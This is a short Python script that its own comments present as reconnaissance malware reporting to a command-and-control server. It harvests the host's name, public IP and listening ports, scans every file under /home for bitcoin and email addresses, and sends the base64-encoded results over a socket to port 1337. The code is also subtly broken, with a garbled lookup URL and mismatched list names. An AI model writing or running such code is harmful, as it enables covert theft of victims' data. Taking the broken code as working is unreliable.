import socket
import requests
import os
import re
import json
import base64


def main():
    # get hostname of the machine
    hostname = socket.gethostname()

    # get the puvlic ipv4 address of the machine
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
    }
    public_ip = requests.get("https://i[api.co/ip", headers=headers).text

    # search for bitcoin and email addresses
    bitcoin_address_list = []
    email_address_list = []

    for root, subdirs, files in os.walk("/home"):
        for file in files:
            file_fd = open("{}/{}".format(root, file), "r")
            try:
                # read the contents of each file
                file_contents = file_fd.read().strip()

                # search for bitcoin addresses
                bitcoin_addresses = re.findall(
                    r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})",
                    file_contents,
                )

                # search for email addresses
                email_addresses = re.findall(
                    r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents
                )

                # check if any bitcoin addresses or emails have been found
                if len(bitcoin_addresses) > 0:
                    bitcoin_addresses_list = bitcoin_addresses_list + bitcoin_addresses
                if len(email_addresses) > 0:
                    email_addresses_list = email_addresses_list + email_addresses
            except:
                pass

    open_ports = os.popen(
        "netstat -plant | grep -i listen | awk '{print $4}' | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'"
    ).read()
    open_ports = open_ports.strip().split("\n")

    # encode data to json and send them to C&C Server
    data = {
        "machine_hostname": hostname,
        "machine_ip": public_ip,
        "machine_open_ports": open_ports,
        "bitcoin_addresses_found": bitcoin_addresses_list,
        "email_addresses_found": email_addresses_list,
    }

    # base64 encode the json data
    encoded_data = base64.b64encode(json.dumps(data).encode())

    # send data to C&C Server

    # create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect to C&C Serverr on port 1337
    s.connect(("127.0.0.1", 1337))
    s.send(encoded_data)
    s.close()
